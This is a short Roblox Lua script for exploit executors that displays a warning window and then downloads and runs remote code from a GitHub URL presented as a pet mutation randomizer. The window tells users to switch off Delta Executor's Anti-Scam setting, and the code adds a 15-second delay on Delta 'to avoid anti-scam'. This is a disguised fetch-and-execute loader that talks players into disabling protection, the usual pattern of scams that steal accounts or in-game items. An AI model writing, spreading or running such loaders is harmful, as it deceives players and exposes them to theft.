--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ProceedButton = Instance.new("TextButton")

--// Parent GUI to CoreGui (so it stays visible)
ScreenGui.Name = "WarningGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui")

--// Frame (not draggable)
Frame.Size = UDim2.new(0, 400, 0, 200)
Frame.Position = UDim2.new(0.5, -200, 0.5, -100)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Active = false
Frame.Parent = ScreenGui

--// Warning Text
TextLabel.Text = "This only works in KRNL for now. If you're using Delta Executor, make sure to turn off the Anti-Scam setting (Delta blocks this script as a scam because they don't want us to get rich). After disabling it, wait 3 seconds then it should pop."
TextLabel.TextWrapped = true
TextLabel.Size = UDim2.new(1, -20, 0.75, -20)
TextLabel.Position = UDim2.new(0, 10, 0, 10)
TextLabel.BackgroundTransparency = 1
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.TextSize = 16
TextLabel.Parent = Frame

--// Proceed Button
ProceedButton.Text = "Proceed"
ProceedButton.Size = UDim2.new(0.5, 0, 0.15, 0)
ProceedButton.Position = UDim2.new(0.25, 0, 0.8, 0)
ProceedButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ProceedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProceedButton.Font = Enum.Font.SourceSansBold
ProceedButton.TextSize = 20
ProceedButton.Parent = Frame

--// Detect Executor
local executor = identifyexecutor and identifyexecutor() or "Unknown"

--// Main Script URL
local scriptUrl = "https://raw.githubusercontent.com/GaGPS/MutationRandomizer/refs/heads/main/PetMutationRandomizerV1.lua"

--// On Click: Remove GUI, run script (15s delay for Delta only)
ProceedButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()

    if string.lower(executor) == "delta" then
        print("[!] Delta detected — waiting 15 seconds to avoid anti-scam...")
        task.delay(15, function()
            loadstring(game:HttpGet(scriptUrl))()
        end)
    else
        print("[✓] Executor:", executor, "- running immediately.")
        loadstring(game:HttpGet(scriptUrl))()
    end
end)
